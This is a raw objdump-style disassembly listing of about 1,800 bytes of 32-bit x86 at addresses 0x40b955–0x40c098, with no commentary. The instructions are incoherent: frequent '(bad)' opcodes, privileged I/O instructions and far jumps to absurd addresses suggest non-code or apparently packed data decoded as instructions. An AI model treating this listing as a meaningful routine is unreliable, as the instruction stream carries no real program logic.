  40b955:	mov    WORD PTR [edx-0x49f50156],ss
  40b95b:	xchg   BYTE PTR [edx+eiz*4],bl
  40b95e:	loope  0x40b947
  40b960:	jmp    0x538358f3
  40b965:	ror    DWORD PTR [ebp-0x756742b3],0x99
  40b96c:	popf   
  40b96d:	xchg   ebp,eax
  40b96e:	les    ecx,FWORD PTR [edi-0x2]
  40b971:	repnz adc eax,DWORD PTR [eax]
  40b974:	pusha  
  40b975:	scas   al,BYTE PTR es:[edi]
  40b976:	fbld   TBYTE PTR [edx-0x5da0b008]
  40b97c:	ror    DWORD PTR [ecx],1
  40b97e:	jecxz  0x40b906
  40b980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b981:	out    dx,eax
  40b982:	xchg   edx,eax
  40b983:	push   es
  40b984:	and    ebx,DWORD PTR [eax-0x6b7fb83d]
  40b98a:	jno    0x40b912
  40b98c:	xor    eax,0x8fbe49a4
  40b991:	sti    
  40b992:	icebp  
  40b993:	sub    bh,dl
  40b995:	loopne 0x40b9db
  40b997:	mov    esi,0x7b3e9efd
  40b99c:	scas   al,BYTE PTR es:[edi]
  40b99d:	scas   eax,DWORD PTR es:[edi]
  40b99e:	add    DWORD PTR ds:0xfb619952,eax
  40b9a4:	repz or bh,BYTE PTR [ebp+0x5b6eadd1]
  40b9ab:	test   al,0xf0
  40b9ad:	scas   al,BYTE PTR es:[edi]
  40b9ae:	inc    esi
  40b9af:	mov    edi,0x43a5db81
  40b9b4:	or     al,0x8e
  40b9b6:	scas   eax,DWORD PTR es:[edi]
  40b9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b8:	js     0x40b97d
  40b9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bb:	and    eax,0x9b62d9be
  40b9c0:	enter  0xa272,0x3a
  40b9c4:	fs inc edi
  40b9c6:	stos   DWORD PTR es:[edi],eax
  40b9c7:	push   esi
  40b9c8:	sbb    eax,0x71447004
  40b9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ce:	loop   0x40b9e1
  40b9d0:	(bad)  
  40b9d1:	mov    ebx,0x79773268
  40b9d6:	scas   eax,DWORD PTR es:[edi]
  40b9d7:	ja     0x40b9d6
  40b9d9:	fdiv   QWORD PTR [edx-0x40]
  40b9dc:	pop    edx
  40b9dd:	jmp    0xc0fea738
  40b9e2:	jne    0x40b99f
  40b9e4:	stos   BYTE PTR es:[edi],al
  40b9e5:	dec    esi
  40b9e6:	out    0xff,al
  40b9e8:	sub    DWORD PTR [edx],0xbdcbdfd6
  40b9ee:	sbb    esi,DWORD PTR [edx]
  40b9f0:	loop   0x40b9fe
  40b9f2:	mov    ecx,0xa03d5e93
  40b9f7:	pop    esi
  40b9f8:	xor    ah,al
  40b9fa:	jmp    0xf114:0x187e71e
  40ba01:	(bad)  
  40ba02:	out    0xe0,eax
  40ba04:	add    ebp,DWORD PTR [ecx+0x41ffde4a]
  40ba0a:	int3   
  40ba0b:	or     al,0x1b
  40ba0d:	sahf   
  40ba0e:	pop    ss
  40ba0f:	aad    0xde
  40ba11:	inc    edx
  40ba12:	sbb    DWORD PTR ds:0x7b3b38c9,ebp
  40ba18:	push   ecx
  40ba19:	rol    ecx,1
  40ba1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1c:	in     al,0xac
  40ba1e:	xchg   edx,eax
  40ba1f:	jnp    0x40ba67
  40ba21:	fnstenv [ebp+0x39227dbe]
  40ba27:	nop
  40ba28:	cli    
  40ba29:	test   esp,0x62f6d33c
  40ba2f:	sar    DWORD PTR ds:0xb4e10b29,1
  40ba35:	sbb    dh,BYTE PTR [edi]
  40ba37:	dec    esi
  40ba38:	mov    DWORD PTR [eax],0x3375d55a
  40ba3e:	pop    ebx
  40ba3f:	jle    0x40b9f7
  40ba41:	push   ss
  40ba42:	or     bh,al
  40ba44:	cmp    DWORD PTR [edx],esp
  40ba46:	ret    0x73d1
  40ba49:	jmp    0x87061c98
  40ba4e:	imul   esp,DWORD PTR [eax-0x50],0xb
  40ba52:	pop    eax
  40ba53:	out    dx,al
  40ba54:	popf   
  40ba55:	and    dl,BYTE PTR [edi-0x57ea86be]
  40ba5b:	out    0xf7,al
  40ba5d:	stos   DWORD PTR es:[edi],eax
  40ba5e:	sbb    BYTE PTR [ecx+edi*4+0x4f],ch
  40ba62:	inc    esp
  40ba63:	shr    cl,0x31
  40ba66:	xchg   BYTE PTR [ecx+ebx*8-0x1bc639f1],dl
  40ba6d:	imul   ecx,DWORD PTR [edi-0x36],0x427bbe0c
  40ba74:	push   edx
  40ba75:	xor    ebp,DWORD PTR [eax-0x79]
  40ba78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba79:	in     al,dx
  40ba7a:	fsub   st(0),st
  40ba7c:	(bad)  [ecx+esi*8]
  40ba7f:	add    eax,DWORD PTR ds:0x640948fd
  40ba85:	xchg   ebx,eax
  40ba86:	mov    al,0x39
  40ba88:	cmp    edi,DWORD PTR [ebp-0x1d8686a3]
  40ba8e:	je     0x40ba6e
  40ba90:	jge    0x40ba36
  40ba92:	push   cs
  40ba93:	das    
  40ba94:	inc    esi
  40ba95:	mov    ebx,0x3be8ee21
  40ba9a:	mov    cl,0xbb
  40ba9c:	xchg   ecx,eax
  40ba9d:	(bad)  
  40ba9e:	mov    cl,0x46
  40baa0:	lods   eax,DWORD PTR ds:[esi]
  40baa1:	sbb    ebp,DWORD PTR [edi-0x21ed8e1a]
  40baa7:	mov    WORD PTR [ebx+eax*4+0x6d2b9719],gs
  40baae:	jmp    0x76f60dbb
  40bab3:	mov    ds:0xb831b026,al
  40bab8:	mov    edx,0x819ee5d2
  40babd:	mov    ds,esp
  40babf:	ins    BYTE PTR es:[edi],dx
  40bac0:	fimul  WORD PTR [edi+edx*4]
  40bac3:	push   ebx
  40bac4:	rcr    bh,0xde
  40bac7:	in     eax,dx
  40bac8:	pop    es
  40bac9:	push   ecx
  40baca:	sahf   
  40bacb:	shl    BYTE PTR [ebp-0x51],0xc3
  40bacf:	mov    ecx,DWORD PTR [ebp-0x38]
  40bad2:	add    bl,BYTE PTR ds:0x4728b44d
  40bad8:	imul   ebp,ebp,0x1
  40badb:	out    0x43,eax
  40badd:	jne    0x40bb1e
  40badf:	cmp    ebp,DWORD PTR [ecx+edi*8]
  40bae2:	mov    WORD PTR [edi+0x6e330ec0],gs
  40bae8:	add    eax,0xc02b41e5
  40baed:	xchg   edx,eax
  40baee:	sub    esi,DWORD PTR [ecx-0x49adbde9]
  40baf4:	shl    edi,cl
  40baf6:	sub    eax,0x7816e570
  40bafb:	jl     0x40bb2e
  40bafd:	jae    0x40ba7f
  40baff:	mov    al,ds:0xcbe9e3b
  40bb04:	mov    DWORD PTR [esi-0x69],0x268794a0
  40bb0b:	dec    eax
  40bb0c:	shr    BYTE PTR [ecx-0x7e04a5],0xa1
  40bb13:	cdq    
  40bb14:	mov    ?,WORD PTR [eax]
  40bb16:	mov    DWORD PTR [ebx],ebp
  40bb18:	lahf   
  40bb19:	mov    fs,esp
  40bb1b:	sub    BYTE PTR [ebx+0x247eb50c],bh
  40bb21:	xor    al,0xfc
  40bb23:	aas    
  40bb24:	sbb    eax,0x2ea03ba0
  40bb29:	jle    0x40bb56
  40bb2b:	cwde   
  40bb2c:	pop    ebx
  40bb2d:	push   ebx
  40bb2e:	adc    BYTE PTR [edx+0x44db2172],ch
  40bb34:	sbb    BYTE PTR [eax-0x4af26bbf],bh
  40bb3a:	ret    0x94bf
  40bb3d:	popa   
  40bb3e:	fdiv   QWORD PTR [edi-0x593601ef]
  40bb44:	cmc    
  40bb45:	push   eax
  40bb46:	xchg   ebx,eax
  40bb47:	inc    edi
  40bb48:	push   ecx
  40bb49:	das    
  40bb4a:	add    al,0x40
  40bb4c:	pop    edx
  40bb4d:	shl    BYTE PTR [ebp+0xd],0x19
  40bb51:	aaa    
  40bb52:	jge    0x40bada
  40bb54:	ror    ecx,0x11
  40bb57:	mov    esi,0x94b81152
  40bb5c:	int3   
  40bb5d:	sub    ebp,DWORD PTR [ebp+edx*4-0x8]
  40bb61:	add    DWORD PTR [ecx-0x75],ebx
  40bb64:	jne    0x40bb29
  40bb66:	aam    0xb2
  40bb68:	inc    esp
  40bb69:	mov    bh,0x48
  40bb6b:	out    0xa8,al
  40bb6d:	and    DWORD PTR [ebp+0x56],eax
  40bb70:	lods   al,BYTE PTR ds:[esi]
  40bb71:	mov    esp,0x20ce70a2
  40bb76:	jo     0x40bbe3
  40bb78:	ins    BYTE PTR es:[edi],dx
  40bb79:	cmp    ecx,DWORD PTR [ebx+0x22b5a339]
  40bb7f:	shl    DWORD PTR [edx+edi*2],cl
  40bb82:	jnp    0x40bbec
  40bb84:	ret    
  40bb85:	sbb    eax,0xb0f28178
  40bb8a:	mov    eax,ds:0x96aa3bb0
  40bb8f:	and    edx,ecx
  40bb91:	sahf   
  40bb92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb93:	(bad)  
  40bb94:	in     eax,0x42
  40bb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb97:	mov    ah,0xb6
  40bb99:	or     ebx,edi
  40bb9b:	inc    ebx
  40bb9c:	jg     0x40bbd3
  40bb9e:	clc    
  40bb9f:	daa    
  40bba0:	int3   
  40bba1:	test   ebp,edx
  40bba3:	mov    eax,0x8b4bc0c4
  40bba8:	and    BYTE PTR [ecx-0x2bcd523f],0x48
  40bbaf:	aas    
  40bbb0:	mov    esi,0xa365bd9b
  40bbb5:	sub    al,0x68
  40bbb7:	mov    eax,0x968b21b0
  40bbbc:	push   esp
  40bbbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbbe:	cmp    DWORD PTR [edx+ecx*4],esi
  40bbc1:	add    ecx,DWORD PTR [ecx-0xe]
  40bbc4:	popa   
  40bbc5:	outs   dx,BYTE PTR ds:[esi]
  40bbc6:	dec    eax
  40bbc7:	cmp    esp,DWORD PTR [edi]
  40bbc9:	xor    eax,0xa1c970ec
  40bbce:	mov    ch,0xcf
  40bbd0:	loope  0x40bc44
  40bbd2:	adc    DWORD PTR [edi+edi*8],esi
  40bbd5:	pop    ecx
  40bbd6:	(bad)  
  40bbd7:	in     al,0xe5
  40bbd9:	mov    al,0x8d
  40bbdb:	fmul   QWORD PTR [edx+0x41]
  40bbde:	xchg   ecx,eax
  40bbdf:	fs push esi
  40bbe1:	pop    esi
  40bbe2:	sub    ebp,0x77
  40bbe5:	xchg   edx,eax
  40bbe6:	shr    DWORD PTR [edi-0x6b8257d6],1
  40bbec:	xor    esp,DWORD PTR [edx]
  40bbee:	loope  0x40bb77
  40bbf0:	test   al,0xb5
  40bbf2:	loop   0x40bc3a
  40bbf4:	fmul   DWORD PTR [ebx-0x362aab7b]
  40bbfa:	xchg   BYTE PTR [ebx],dh
  40bbfc:	or     al,0x62
  40bbfe:	inc    ebx
  40bbff:	cli    
  40bc00:	and    eax,0xefa4ee9c
  40bc05:	mov    dh,0x2a
  40bc07:	mov    cl,0xa4
  40bc09:	xchg   ecx,eax
  40bc0a:	pop    ss
  40bc0b:	out    0x6c,eax
  40bc0d:	gs dec ecx
  40bc0f:	push   ss
  40bc10:	xchg   ebp,eax
  40bc11:	je     0x40bbd3
  40bc13:	stos   BYTE PTR es:[edi],al
  40bc14:	sub    esp,0x11635bd4
  40bc1a:	and    DWORD PTR [esi+0x217b0aaf],eax
  40bc20:	rol    BYTE PTR [edx+eiz*1],cl
  40bc23:	lock add eax,0xf36a90d9
  40bc29:	sub    edx,DWORD PTR [ecx+edx*4+0x32e12aa2]
  40bc30:	push   cs
  40bc31:	mov    ah,0x4b
  40bc33:	pop    esi
  40bc34:	jb     0x40bcb5
  40bc36:	cmc    
  40bc37:	xchg   esp,eax
  40bc38:	retf   
  40bc39:	sahf   
  40bc3a:	test   dh,dh
  40bc3c:	les    edi,FWORD PTR [eax-0x71684271]
  40bc42:	lods   eax,DWORD PTR ds:[esi]
  40bc43:	mov    DWORD PTR [ebx],ebp
  40bc45:	adc    dh,BYTE PTR [esi+edi*4-0x6742ed24]
  40bc4c:	int3   
  40bc4d:	fild   QWORD PTR [ebp+0xdf1216b]
  40bc53:	retf   
  40bc54:	pop    esp
  40bc55:	jns    0x40bc51
  40bc57:	fwait
  40bc58:	(bad)  
  40bc59:	sbb    eax,0xd93b6144
  40bc5e:	push   eax
  40bc5f:	ds test eax,0x7f424057
  40bc65:	mov    edi,0xaab0b6bb
  40bc6a:	dec    edi
  40bc6b:	xor    al,0x3f
  40bc6d:	imul   edx,esp,0x396491dc
  40bc73:	mov    bh,0xb
  40bc75:	in     al,0x26
  40bc77:	mov    esp,ecx
  40bc79:	pushf  
  40bc7a:	sbb    esi,0x181a14de
  40bc80:	repnz sbb al,ch
  40bc83:	push   ecx
  40bc84:	add    eax,0x4a83d0e
  40bc89:	mov    DWORD PTR [edx+0x5],ecx
  40bc8c:	fisub  DWORD PTR [edx-0x34a6559e]
  40bc92:	mov    ebx,0x82155374
  40bc97:	cmp    BYTE PTR [ecx],bl
  40bc99:	mov    es,edx
  40bc9b:	inc    cx
  40bc9d:	or     eax,0x3a1288c7
  40bca2:	jae    0x40bcbb
  40bca4:	pop    ecx
  40bca5:	(bad)  
  40bca6:	jmp    0x2b719821
  40bcab:	fistp  QWORD PTR [ebx]
  40bcad:	fimul  DWORD PTR [ebx-0x79f037ab]
  40bcb3:	add    eax,DWORD PTR [eax]
  40bcb5:	add    BYTE PTR [eax],al
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	sbb    ebp,DWORD PTR [ebp-0x711b4b37]
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	push   ds
  40bcdf:	xorps  xmm4,xmm2
  40bce2:	dec    edx
  40bce3:	dec    edi
  40bce4:	pop    edx
  40bce5:	jmp    0xbb51:0xa2bbb735
  40bcec:	mov    ss,esi
  40bcee:	aaa    
  40bcef:	mov    ah,0x7b
  40bcf1:	fadd   DWORD PTR [ebp+0x2d]
  40bcf4:	pop    edi
  40bcf5:	sub    ah,al
  40bcf7:	stos   BYTE PTR es:[edi],al
  40bcf8:	mov    al,0x22
  40bcfa:	jo     0x40bcc3
  40bcfc:	jne    0x40bcab
  40bcfe:	cmp    al,BYTE PTR [ecx-0x62]
  40bd01:	dec    ecx
  40bd02:	sub    BYTE PTR [ebx+edi*1],ah
  40bd05:	cmc    
  40bd06:	jg     0x40bd5e
  40bd08:	xchg   eax,ecx
  40bd0a:	(bad)  
  40bd0b:	sub    DWORD PTR [ecx-0x279dda1f],edx
  40bd11:	sub    DWORD PTR [eax],ecx
  40bd13:	inc    edi
  40bd14:	mov    esp,0x3d7ae8a3
  40bd19:	or     DWORD PTR [edi+0x62],esi
  40bd1c:	iret   
  40bd1d:	pushf  
  40bd1e:	retf   
  40bd1f:	jp     0x40bcea
  40bd21:	nop
  40bd22:	fstp   TBYTE PTR [edi+0x4bcccc2]
  40bd28:	imul   edi,DWORD PTR [esi],0x96f764dd
  40bd2e:	mov    dl,0xe5
  40bd30:	xor    eax,0x26619720
  40bd36:	add    al,0x92
  40bd38:	or     cl,BYTE PTR [esi+0x37897093]
  40bd3e:	and    BYTE PTR [ebp+0x42],bh
  40bd41:	push   esp
  40bd42:	outs   dx,DWORD PTR ds:[esi]
  40bd43:	ja     0x40bd86
  40bd45:	mov    ah,0x79
  40bd47:	scas   eax,DWORD PTR es:[edi]
  40bd48:	xchg   ebx,eax
  40bd49:	daa    
  40bd4a:	nop
  40bd4b:	or     DWORD PTR [ebx-0x5667ca21],ebx
  40bd51:	jnp    0x40bd11
  40bd53:	test   DWORD PTR [edx-0x242de2b7],edx
  40bd59:	lea    ebp,[esi-0x55]
  40bd5c:	hlt    
  40bd5d:	xchg   edx,eax
  40bd5e:	adc    ecx,edi
  40bd60:	test   BYTE PTR [bx+si-0x66],cl
  40bd64:	push   eax
  40bd65:	adc    esi,DWORD PTR [ecx+esi*8]
  40bd68:	mov    eax,0xd5c112f4
  40bd6d:	test   DWORD PTR [eax-0x319db20c],edx
  40bd73:	rcr    BYTE PTR [eax+edi*4],0xd8
  40bd77:	mov    dh,0xb3
  40bd79:	xchg   esi,eax
  40bd7a:	mov    al,0x9b
  40bd7c:	test   BYTE PTR [ebp-0x2f],ah
  40bd7f:	(bad)  
  40bd81:	mov    dh,0x81
  40bd83:	dec    esp
  40bd84:	(bad)  
  40bd85:	xchg   ecx,eax
  40bd86:	leave  
  40bd87:	sbb    ah,BYTE PTR [edi+0x27]
  40bd8a:	push   eax
  40bd8b:	inc    edi
  40bd8c:	(bad)  
  40bd8d:	xchg   esi,eax
  40bd8e:	push   ebp
  40bd8f:	hlt    
  40bd90:	and    al,0x9d
  40bd92:	in     al,0xef
  40bd94:	mov    edi,0x7806877
  40bd99:	push   edx
  40bd9a:	sub    ebx,DWORD PTR [ebp+0x5f3a2adc]
  40bda0:	in     al,0x4b
  40bda2:	inc    ecx
  40bda3:	loope  0x40bd8c
  40bda5:	into   
  40bda6:	lods   al,BYTE PTR ds:[esi]
  40bda7:	add    ebx,DWORD PTR [ecx]
  40bda9:	icebp  
  40bdaa:	push   ebp
  40bdab:	(bad)  
  40bdac:	inc    esi
  40bdad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdae:	hlt    
  40bdaf:	adc    DWORD PTR [esi-0x4f854b4f],ebx
  40bdb5:	xor    eax,0x552942af
  40bdba:	and    edx,DWORD PTR [eax+0x21]
  40bdbd:	(bad)  
  40bdbe:	sub    ebx,DWORD PTR [edi]
  40bdc0:	fcmovnb st,st(6)
  40bdc2:	or     DWORD PTR [ecx+0x19],0x56
  40bdc6:	xchg   esi,eax
  40bdc7:	adc    DWORD PTR [edx+eiz*4+0x309f0a08],edi
  40bdce:	and    al,0x45
  40bdd0:	inc    eax
  40bdd1:	lock push ebx
  40bdd3:	loope  0x40be09
  40bdd5:	test   al,0xcb
  40bdd7:	test   al,0xba
  40bdd9:	pop    ss
  40bdda:	mov    ebp,DWORD PTR [ebx-0x33]
  40bddd:	add    al,0x2
  40bddf:	cs cs int 0xb9
  40bde3:	mov    eax,0xb484c4f7
  40bde8:	in     al,dx
  40bde9:	xor    al,0xf0
  40bdeb:	pusha  
  40bdec:	dec    edx
  40bded:	push   edi
  40bdee:	sti    
  40bdef:	adc    BYTE PTR [ecx-0x1f],ch
  40bdf2:	xor    eax,0x21f65bd9
  40bdf7:	sub    DWORD PTR [edx-0x28],0xffffff88
  40bdfb:	hlt    
  40bdfc:	sub    edx,ecx
  40bdfe:	cmp    edx,eax
  40be00:	push   esp
  40be01:	loope  0x40bdf1
  40be03:	dec    eax
  40be04:	psllq  mm6,QWORD PTR [esi]
  40be07:	repz dec edx
  40be09:	stos   BYTE PTR es:[edi],al
  40be0a:	adc    ebp,DWORD PTR [esi+0x2a7f174a]
  40be10:	mov    es,WORD PTR [ecx-0x32]
  40be13:	mov    ebp,0x72784819
  40be18:	add    BYTE PTR [edi+0x50],0x11
  40be1c:	es call 0x853702b
  40be22:	pop    esi
  40be23:	push   cs
  40be24:	ret    
  40be25:	or     al,0x73
  40be27:	mov    edi,0xbb20525f
  40be2c:	fld    TBYTE PTR [edx-0x1d]
  40be2f:	mov    esp,0x7b7a5af8
  40be34:	cs dec esp
  40be36:	fstp   DWORD PTR [esi+0x26]
  40be39:	push   eax
  40be3a:	repnz add ebp,DWORD PTR [ebp+0xc]
  40be3e:	cmp    al,0xc5
  40be40:	sbb    dh,BYTE PTR [edx-0x70]
  40be43:	aad    0x32
  40be45:	fst    DWORD PTR [edx]
  40be47:	andps  xmm6,xmm4
  40be4a:	pop    ebp
  40be4b:	cmp    eax,DWORD PTR [ecx-0x3de6a0a9]
  40be51:	mov    esi,0x72536f19
  40be56:	loope  0x40be48
  40be58:	adc    ebp,DWORD PTR [ebx+0x3fa74df3]
  40be5e:	test   BYTE PTR [ebp-0x1a],ch
  40be61:	les    esi,FWORD PTR [ecx+0x51]
  40be64:	add    BYTE PTR [ebx],cl
  40be66:	inc    esi
  40be67:	adc    esi,esp
  40be69:	je     0x40be93
  40be6b:	sub    BYTE PTR [eax+ebx*2],ch
  40be6e:	sub    eax,0x2f85b308
  40be73:	mov    bh,0x18
  40be75:	sbb    dh,BYTE PTR [ebp-0x5d]
  40be78:	pop    es
  40be79:	int    0x89
  40be7b:	adc    ah,bh
  40be7d:	arpl   WORD PTR [eax+0x62],dx
  40be80:	xchg   ecx,eax
  40be81:	dec    edx
  40be82:	rcl    cl,0x48
  40be85:	enter  0xac98,0x7
  40be89:	les    ebp,FWORD PTR ds:0x4dc0909a
  40be8f:	or     dl,BYTE PTR [ebp+0x3c650aee]
  40be95:	bound  ecx,QWORD PTR [ebp-0x44]
  40be98:	ja     0x40be61
  40be9a:	stc    
  40be9b:	retf   0xf516
  40be9e:	in     al,dx
  40be9f:	mov    ecx,0xd079d7d
  40bea4:	stos   DWORD PTR es:[edi],eax
  40bea5:	jbe    0x40be99
  40bea7:	or     ch,dh
  40bea9:	pop    edi
  40beaa:	inc    ebp
  40beab:	dec    esp
  40beac:	add    al,BYTE PTR [edx]
  40beae:	mov    WORD PTR [edx+0x49],fs
  40beb1:	imul   DWORD PTR [ebx+0xa56f0f4]
  40beb7:	ins    DWORD PTR es:[edi],dx
  40beb8:	pop    eax
  40beb9:	cli    
  40beba:	cld    
  40bebb:	jne    0x40bebf
  40bebd:	push   esi
  40bebe:	mov    edi,0x4ea7b610
  40bec3:	push   esi
  40bec4:	test   eax,0x445a03b6
  40bec9:	inc    ebx
  40beca:	cs retf 
  40becc:	nop
  40becd:	sar    DWORD PTR [edi+0x75fd5382],cl
  40bed3:	sbb    eax,0xcf12b4b
  40bed8:	mov    DWORD PTR [edx+0x7e],ebx
  40bedb:	sbb    al,0x34
  40bedd:	gs mov edx,0xc5e626ff
  40bee3:	(bad)  
  40bee5:	pop    ds
  40bee6:	and    ebp,ebp
  40bee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee9:	mov    bh,0x36
  40beeb:	(bad)  
  40beec:	jl     0x40bf26
  40beee:	adc    dh,bl
  40bef0:	sbb    DWORD PTR [eax-0x5ba79594],0x2b
  40bef7:	repz imul ebp,esi,0x2a
  40befb:	mov    ch,0xe3
  40befd:	jns    0x40bead
  40beff:	dec    esp
  40bf00:	mov    ds:0x56150dcf,eax
  40bf05:	dec    esp
  40bf06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf07:	les    edi,FWORD PTR [eax-0x31]
  40bf0a:	mov    bl,0x44
  40bf0c:	or     eax,0x1d687b09
  40bf11:	bound  esi,QWORD PTR ds:0x60b24798
  40bf17:	clc    
  40bf18:	add    edi,ebx
  40bf1a:	idiv   DWORD PTR [eax-0x23]
  40bf1d:	int3   
  40bf1e:	xchg   ebx,eax
  40bf1f:	daa    
  40bf20:	ins    BYTE PTR es:[edi],dx
  40bf21:	in     eax,0x80
  40bf23:	pop    ss
  40bf24:	repnz xor al,0xa
  40bf27:	ins    BYTE PTR es:[edi],dx
  40bf28:	and    BYTE PTR [ecx-0x30000ef],0x49
  40bf2f:	pop    ebp
  40bf30:	les    edx,FWORD PTR [esp+eax*2-0x4a]
  40bf34:	inc    edx
  40bf35:	ins    BYTE PTR es:[edi],dx
  40bf36:	inc    esp
  40bf37:	stos   DWORD PTR es:[edi],eax
  40bf38:	add    dh,BYTE PTR [esi-0x8]
  40bf3b:	pop    ecx
  40bf3c:	xchg   BYTE PTR [esi],dl
  40bf3e:	sub    bh,BYTE PTR [ebp+0x59]
  40bf41:	mov    ah,0x94
  40bf43:	sub    DWORD PTR [ecx-0x60],ecx
  40bf46:	out    dx,eax
  40bf47:	lods   eax,DWORD PTR ds:[esi]
  40bf48:	scas   eax,DWORD PTR es:[edi]
  40bf49:	xchg   ebx,eax
  40bf4a:	xchg   DWORD PTR [eax+ecx*1],esi
  40bf4d:	test   eax,0x5a6f8385
  40bf52:	aam    0x26
  40bf54:	mov    dl,0xc2
  40bf56:	lea    edx,es:[ebp+0x53673b09]
  40bf5d:	shr    DWORD PTR [ebp-0x4e269a61],cl
  40bf63:	pop    edx
  40bf64:	(bad)  
  40bf65:	mov    ah,0x76
  40bf67:	addr16 pop esp
  40bf69:	cmp    BYTE PTR [ecx],cl
  40bf6b:	stos   BYTE PTR es:[edi],al
  40bf6c:	enter  0xdd0,0x6d
  40bf70:	or     bl,BYTE PTR [edx-0x7c96a0b]
  40bf76:	fcomp  QWORD PTR [edi-0x29813dce]
  40bf7c:	ror    DWORD PTR [eax-0x51],cl
  40bf7f:	or     al,0xb1
  40bf81:	cwde   
  40bf82:	int3   
  40bf83:	loop   0x40bfeb
  40bf85:	inc    esp
  40bf86:	scas   eax,DWORD PTR es:[edi]
  40bf87:	mov    bl,0xe9
  40bf89:	inc    esp
  40bf8a:	in     al,0x64
  40bf8c:	inc    BYTE PTR [ebx+0x4b]
  40bf8f:	xchg   edi,eax
  40bf90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf91:	xchg   dx,ax
  40bf93:	jb     0x40bfba
  40bf95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf96:	out    0xce,eax
  40bf98:	dec    esi
  40bf99:	xor    DWORD PTR ds:0xbf5d8fed,ebp
  40bf9f:	mov    BYTE PTR [edx],bl
  40bfa1:	add    al,0xfd
  40bfa3:	cld    
  40bfa4:	jp     0x40bf29
  40bfa6:	stc    
  40bfa7:	add    eax,0x369a1298
  40bfac:	aam    0x80
  40bfae:	sar    BYTE PTR [esi-0x67],cl
  40bfb1:	add    DWORD PTR [edi],0x12
  40bfb4:	imul   edi,DWORD PTR [eax],0x9c581cc5
  40bfba:	retf   0x7f7b
  40bfbd:	push   esi
  40bfbe:	scas   eax,DWORD PTR es:[edi]
  40bfbf:	scas   eax,DWORD PTR es:[edi]
  40bfc0:	mov    ebp,0x564a4c0e
  40bfc5:	push   esi
  40bfc6:	scas   eax,DWORD PTR es:[edi]
  40bfc7:	fwait
  40bfc8:	dec    ebp
  40bfc9:	xor    eax,0x48ce77d9
  40bfce:	hlt    
  40bfcf:	xchg   ebx,eax
  40bfd0:	inc    ebx
  40bfd1:	inc    ebp
  40bfd2:	stc    
  40bfd3:	and    edi,DWORD PTR [edx]
  40bfd5:	jbe    0x40bfc8
  40bfd7:	jno    0x40bfd6
  40bfd9:	or     DWORD PTR [ecx],edi
  40bfdb:	stos   BYTE PTR es:[edi],al
  40bfdc:	or     al,BYTE PTR ds:0x8c617ccb
  40bfe2:	and    al,0x8
  40bfe4:	loope  0x40bf83
  40bfe6:	push   edi
  40bfe7:	(bad)  
  40bfe8:	pop    ss
  40bfe9:	mov    ds:0x60214f71,al
  40bfee:	sub    eax,0x63320de0
  40bff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bff4:	fst    QWORD PTR [ecx+0x6f9eb413]
  40bffa:	into   
  40bffb:	push   eax
  40bffc:	add    eax,0xea5013b4
  40c001:	pop    edx
  40c002:	jmp    0xad7f:0xccf709e8
  40c009:	ret    0xc202
  40c00c:	dec    ecx
  40c00d:	js     0x40c042
  40c00f:	clc    
  40c010:	adc    edx,esp
  40c012:	pusha  
  40c013:	xchg   DWORD PTR [eax-0x6073ff57],ecx
  40c019:	out    dx,eax
  40c01a:	int3   
  40c01b:	fld    DWORD PTR [esi]
  40c01d:	sbb    DWORD PTR [eax],0x7a
  40c020:	addr16 lahf 
  40c022:	bound  esi,QWORD PTR [esi+0x36]
  40c025:	inc    ebp
  40c026:	mov    WORD PTR [edi+0xa],?
  40c029:	sub    ebp,edi
  40c02b:	fisub  DWORD PTR [esi+0x79]
  40c02e:	cmp    BYTE PTR [edx-0x7],bh
  40c031:	mov    al,ds:0xd1e929a3
  40c036:	arpl   WORD PTR ds:0x80a53dc8,ax
  40c03c:	jmp    0x588c:0x9bfc91df
  40c043:	pop    eax
  40c044:	pop    es
  40c045:	inc    edi
  40c046:	jne    0x40c007
  40c048:	xchg   esi,eax
  40c049:	cmc    
  40c04a:	push   es
  40c04b:	rol    al,1
  40c04d:	adc    al,0xa6
  40c04f:	div    DWORD PTR [ebp+0x596c09cc]
  40c055:	fs add eax,edi
  40c058:	pop    esi
  40c059:	shr    BYTE PTR [ecx+0x6ce88754],1
  40c05f:	mov    esp,0xfb91d6b7
  40c064:	test   BYTE PTR ds:0x30344b48,ah
  40c06a:	mov    bl,0xa5
  40c06c:	stos   DWORD PTR es:[edi],eax
  40c06d:	push   ecx
  40c06e:	popa   
  40c06f:	mov    ds,esp
  40c071:	cs scas eax,DWORD PTR es:[edi]
  40c073:	scas   eax,DWORD PTR es:[edi]
  40c074:	cmp    ebx,DWORD PTR [ebp-0x7359a3e9]
  40c07a:	loop   0x40c043
  40c07c:	sub    eax,0x22a7f608
  40c081:	mov    ds:0xa6af508e,eax
  40c086:	pop    ss
  40c087:	call   0xa4e0:0x3583012b
  40c08e:	and    BYTE PTR [edi-0x3c],ah
  40c091:	pop    esi
  40c092:	xor    dh,BYTE PTR [edx+edx*8+0x46]
  40c096:	lahf   
  40c097:	push   es
  40c098:	xor    edx,DWORD PTR [esi-0x5fa0ed7]
